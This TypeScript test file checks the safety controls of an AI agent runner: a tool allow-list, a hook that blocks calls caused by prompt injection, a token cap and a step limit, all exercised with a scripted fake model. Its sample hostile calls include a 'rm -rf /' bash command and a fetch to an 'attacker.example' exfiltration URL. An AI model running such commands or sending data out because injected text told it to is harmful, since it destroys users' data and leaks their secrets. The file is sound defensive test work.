import { describe, expect, it, vi } from 'vitest'
import { AgentRunner, type ModelStep, type ModelTurn, type ToolCall } from './agent-runner'

const usage = (t: number) => ({ inputTokens: t, outputTokens: 0, totalTokens: t })
const toolUse = (calls: ToolCall[], t = 10): ModelTurn => ({
  kind: 'tool_use',
  toolCalls: calls,
  usage: usage(t)
})
const final = (text: string, t = 5): ModelTurn => ({ kind: 'final', text, usage: usage(t) })

/** A scripted model: returns the next canned turn each call. No model, no keys. */
const scripted = (turns: ModelTurn[]): ModelStep => {
  let i = 0
  return async () => turns[Math.min(i++, turns.length - 1)]
}

describe('AgentRunner safety', () => {
  it('executes allowed tools and returns the final text', async () => {
    const exec = vi.fn(async () => ({ rows: 3 }))
    const res = await new AgentRunner().run(
      'count rows',
      scripted([toolUse([{ id: '1', name: 'xnet_search', input: { q: 'a' } }]), final('done')]),
      { allowedTools: ['xnet_search'], executeTool: exec }
    )
    expect(res.stoppedBy).toBe('final')
    expect(res.text).toBe('done')
    expect(res.denials).toHaveLength(0)
    expect(exec).toHaveBeenCalledOnce()
  })

  it('denies a tool not on the allow-list and never executes it', async () => {
    const exec = vi.fn(async () => null)
    const res = await new AgentRunner().run(
      'do bad',
      scripted([
        toolUse([{ id: '1', name: 'bash', input: { cmd: 'rm -rf /' } }]),
        final('stopped')
      ]),
      { allowedTools: ['xnet_search'], executeTool: exec }
    )
    expect(res.denials).toEqual([
      { tool: 'bash', reason: expect.stringContaining('not in allowedTools') }
    ])
    expect(exec).not.toHaveBeenCalled()
  })

  it('lets a preToolUse hook block a prompt-injected call', async () => {
    const exec = vi.fn(async () => null)
    const res = await new AgentRunner().run(
      'summarize this doc',
      scripted([
        // The doc tried to make the agent exfiltrate via an allowed tool.
        toolUse([{ id: '1', name: 'fetch_url', input: { url: 'http://attacker.example/steal' } }]),
        final('ignored the injection')
      ]),
      {
        allowedTools: ['fetch_url'],
        preToolUse: (call) => {
          const url = (call.input as { url?: string }).url ?? ''
          return url.includes('attacker')
            ? { allow: false, reason: 'prompt-injection: external exfiltration blocked' }
            : { allow: true }
        },
        executeTool: exec
      }
    )
    expect(res.denials[0].reason).toMatch(/prompt-injection/)
    expect(exec).not.toHaveBeenCalled()
    expect(res.text).toBe('ignored the injection')
  })

  it('trips the token-cap circuit breaker on a runaway loop', async () => {
    // The model keeps emitting tool calls forever; each turn burns 100 tokens.
    const runaway: ModelStep = async () =>
      toolUse([{ id: 'x', name: 'xnet_search', input: {} }], 100)
    const res = await new AgentRunner().run('loop', runaway, {
      allowedTools: ['xnet_search'],
      executeTool: async () => ({}),
      maxTotalTokens: 250
    })
    expect(res.stoppedBy).toBe('token-cap')
    expect(res.tokensUsed).toBeGreaterThan(250)
  })

  it('stops at maxSteps if the model never finalizes', async () => {
    const res = await new AgentRunner().run(
      'loop',
      async () => toolUse([{ id: 'x', name: 'xnet_search', input: {} }], 1),
      { allowedTools: ['xnet_search'], executeTool: async () => ({}), maxSteps: 3 }
    )
    expect(res.stoppedBy).toBe('max-steps')
    expect(res.steps).toBe(3)
  })
})
